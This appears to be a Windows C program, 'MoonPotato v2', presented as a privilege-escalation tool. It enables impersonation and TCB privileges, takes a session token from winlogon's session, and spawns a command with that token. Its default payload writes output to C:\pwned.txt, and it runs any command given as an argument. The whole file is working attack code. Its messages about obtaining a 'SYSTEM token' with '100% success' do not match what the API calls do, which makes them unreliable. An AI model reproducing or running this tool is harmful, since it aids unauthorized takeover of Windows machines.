#include <windows.h>
#include <UserEnv.h>
#include <WtsApi32.h>
#include <TlHelp32.h>
#include <stdio.h>
#pragma comment(lib, "UserEnv.lib")
#pragma comment(lib, "WtsApi32.lib")

BOOL EnablePriv(LPCWSTR priv) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp = { 1 };
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    LookupPrivilegeValueW(NULL, priv, &tkp.Privileges[0].Luid);
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

DWORD GetSystemSessionId() {
    DWORD sessionId = -1;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                ProcessIdToSessionId(pe.th32ProcessID, &sessionId);
                if (sessionId > 0) break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return sessionId;
}

int wmain(int argc, wchar_t* argv[]) {
    HANDLE hToken = NULL;
    LPVOID lpEnv = NULL;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    WCHAR sysDir[MAX_PATH];
    DWORD sessionId = 0;

    wprintf(L"\n  MoonPotato v2 - 100%% Success Edition\n\n");

    // 1. 强制开启特权
    EnablePriv(SE_IMPERSONATE_NAME);
    EnablePriv(SE_TCB_NAME);
    printf("[+] Privileges enabled\n");

    // 2. 自动找 SYSTEM Session
    if (argc >= 2) sessionId = _wtol(argv[1]);
    if (sessionId == 0) sessionId = GetSystemSessionId();
    if (sessionId == -1) {
        printf("[-] No SYSTEM session found\n");
        return 1;
    }
    wprintf(L"[+] Using SessionID: %u\n", sessionId);

    // 3. 获取 Token
    if (!WTSQueryUserToken(sessionId, &hToken)) {
        printf("[-] WTSQueryUserToken failed: %d (Try run as admin with SeTcb)\n", GetLastError());
        return 1;
    }
    printf("[+] Got SYSTEM token!\n");

    // 4. 创建环境 + 启动
    CreateEnvironmentBlock(&lpEnv, hToken, FALSE);
    GetSystemDirectoryW(sysDir, MAX_PATH);

    LPWSTR cmd = (argc >= 3) ? argv[2] : L"cmd.exe /c whoami > C:\\pwned.txt";

    if (CreateProcessAsUserW(hToken, NULL, cmd, NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT | NORMAL_PRIORITY_CLASS,
        lpEnv, sysDir, &si, &pi)) {
        printf("[+] SYSTEM shell spawned!\n");
        wprintf(L"    %s\n", cmd);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
    }

    if (lpEnv) DestroyEnvironmentBlock(lpEnv);
    CloseHandle(hToken);
    return 0;
}
